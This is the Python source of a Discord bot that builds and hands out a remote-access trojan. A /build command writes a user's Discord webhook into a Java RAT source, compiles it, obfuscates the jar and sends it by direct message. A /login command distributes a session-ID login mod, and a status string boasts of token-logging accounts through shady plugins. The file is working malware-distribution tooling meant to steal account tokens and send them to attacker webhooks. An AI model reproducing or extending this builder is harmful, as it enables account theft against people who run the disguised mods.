# fun fact, most comments were written by github copilot

import os
import discord
from discord.ext import commands, tasks
import requests
import random
import json

# made by gute nacht...........

builtfiles = []
possiblestatuses = ["cute nacht 😍", "I love gute nacht", "gute nacht is the best", "I can't code for shit", "hi @Gute Nacht#0221", "this account has been token logged by gute nacht. 不错尝试下载阴暗的插件. gute nacht 赞了这个帐号", "made by Gute Nacht#0221"]
cwd = os.getcwd()

# loads the config file
data = open("config.json")
config = json.load(data)
token = config["config"]["token"]
client = commands.Bot()

# config stuff
path = config["config"]["path"]
exportname = config["config"]["exportname"]
line = 38 - 1
stringname = config["config"]["stringname"]
obfuscatedfilename = config["config"]["exportname"]+ ".jar" + "-out.jar"

# embeds
invalidwebhookembed = discord.Embed(title="You added an invalid webhook ☹️", description='Your webhook responded with an error code. Try creating a new one!', color=0xFFFFFF)
successembed = discord.Embed(title="Success! 🎉", description="Your RAT has been built successfully.", color=0xFFFFFF)
buildingembed = discord.Embed(description=f"`✅` Your file is being built. Please wait about 25 seconds...", color=0xFFFFFF)
invalidwebhookembed.add_field(name="If you believe this is false", value="message a staff member.")
successembed.add_field(name="A file has been sent to your direct messages!", value="If you did not recieve one, make sure you can recieve dms from members in your servers.")
successembed.set_footer(text="Thank you! Made by Gute Nacht")

# validates the webhook
def validatewebhook(webhook):
    global webhookvalidity
    try:
        check = requests.get(webhook)
        if check.status_code == 404:
            return False
        elif check.status_code == 200:
            return True
    except:
        return


@client.event
async def on_ready():
    # clears the console
    os.system("cls")
    # prints login message
    print("Logged in as " + client.user.name)
    # starts the status loop
    loop.start()

@client.slash_command(name="build", description="Build a RAT with the webhook you added in the field past the command.")
@commands.cooldown(1, 60, commands.BucketType.user)
async def build(ctx, *, webhook=None):
    global userid, user
    user = ctx.author
    userid = ctx.author.id

    # checks webhook validity
    if webhook == None:
        await ctx.respond(embed=discord.Embed(description=f"You need to add a webhook silly!", color=0xFFFFFF), ephemeral=True)
        return
    if not webhook.startswith("https://discord.com/api/webhooks") and not webhook.startswith("https://discordapp.com/api/webhooks") and not webhook.startswith("https://canary.discord.com/api/webhooks") and not webhook.startswith("https://ptb.discord.com/api/webhooks") or not webhook.startswith("https://discord.com/api/webhooks"):
       await ctx.respond(embed=invalidwebhookembed, ephemeral=True)
       return
    if validatewebhook(webhook) == False:
        print(validatewebhook(webhook))
        await ctx.respond(embed=invalidwebhookembed, ephemeral=True)
        return

    ratpath = f"{cwd}/rat/src/main/java/{path}"

    # edits the file to include the webhook
    file = open(ratpath, "r")
    list_of_lines = file.readlines()
    list_of_lines[line] = f'        String {stringname} = "{webhook}";\n'

    file = open(ratpath, "w")
    file.writelines(list_of_lines)
    file.close()

    await ctx.respond(embed=buildingembed, ephemeral=True)

    # builds the file
    os.chdir(f"{cwd}/rat")
    os.system("gradlew build")
    os.chdir(cwd)
    # obfuscates the file
    os.system("python obfuscate.py")

    print("Obfuscated")

    # sends the file to the user in their dms
    member = ctx.author
    await member.create_dm()
    await member.dm_channel.send(file=discord.File(f"{cwd}/rat/build/libs/{obfuscatedfilename}"))

    await ctx.respond(embed=successembed, ephemeral=True)

    os.system("cls")
    import datetime
    now = datetime.datetime.now()
    dt_string = now.strftime("%D %H:%M:%S")
    builtfiles.append(f"Built file for {ctx.author}/{ctx.author.id} at {dt_string}")
    print(*builtfiles, sep='\n')

# cooldown for build command, you can reduce it by changing the second number in the line after the @client.slash_command(name="build"...) line
@build.error
async def command_name_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        embed = discord.Embed(title=f"You can only run this command every 60 seconds!",description=f"Try again in {error.retry_after:.2f} seconds.", color=0xFFFFFF)
        await ctx.send(embed=embed, ephemeral=True)


# this command sends the login mod to the user in their dms
@client.slash_command(name="login", description="Mod to log in with session IDS")
async def login(ctx):
    await ctx.respond(embed=discord.Embed(title="Success! 🎉", description=f"**A file has been sent to your direct messages!**\nIf you did not recieve one, make sure you can recieve dms from members in your servers.", color=0xFFFFFF), ephemeral=True)
    member = ctx.author
    await member.create_dm()
    await member.dm_channel.send(file=discord.File(f"{cwd}/loginmod/TokenAuth.jar"))

# this loop changes the status of the bot every 10 seconds
@tasks.loop(seconds=10)
async def loop():
    status = random.choice(possiblestatuses)
    await client.change_presence(activity=discord.Game(status))

client.run(token)
